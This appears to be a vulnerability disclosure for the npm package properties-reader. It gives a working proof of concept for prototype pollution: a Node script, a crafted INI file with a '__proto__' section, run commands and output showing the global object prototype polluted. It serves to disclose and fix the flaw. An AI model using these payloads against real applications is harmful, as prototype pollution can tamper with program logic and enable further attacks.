# Description

`properties-reader` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC and INI files:

```
// poc.js
var propertiesReader = require('properties-reader');
console.log("Before : " + {}.polluted)
console.log("Before : " + {}.polluted1)
var properties = propertiesReader('./payload.ini');
properties.set("__proto__.polluted1", "Yes! Its Polluted1");
console.log("After : " + {}.polluted)
console.log("After : " + {}.polluted1)

//payload.ini
[__proto__]
polluted = "Yes! Its Polluted"
```


2. Execute the following commands in terminal:

```
npm i properties-reader # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
Before : undefined
After : "Yes! Its Polluted"
After : Yes! Its Polluted1
```
